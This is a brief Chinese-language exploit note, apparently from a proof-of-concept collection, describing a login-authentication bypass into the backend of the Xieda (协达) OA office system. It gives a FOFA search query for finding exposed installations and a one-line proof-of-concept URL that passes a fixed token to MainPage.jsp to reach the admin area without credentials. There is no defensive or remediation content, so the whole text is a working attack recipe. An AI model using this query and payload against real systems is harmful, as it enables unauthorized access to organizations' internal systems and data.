## 协达OA系统绕过登录认证登陆后台

## fofa
```
body="/interface/CheckLoginName.jsp"
```

## poc
```
http://ip/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN
```
